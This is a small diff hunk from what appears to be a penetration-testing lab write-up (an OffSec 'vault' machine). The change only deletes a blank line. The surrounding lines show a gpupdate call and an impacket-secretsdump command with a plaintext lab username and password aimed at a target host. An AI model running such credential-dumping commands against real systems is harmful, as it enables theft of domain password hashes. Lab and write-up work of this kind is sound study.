@@ -46,7 +46,6 @@ gpupdate /force
 impacket-secretsdump vault.offsec/anirudh:SecureHM@TARGET
 ```
 
-
 ### References
 
 - _(none)_
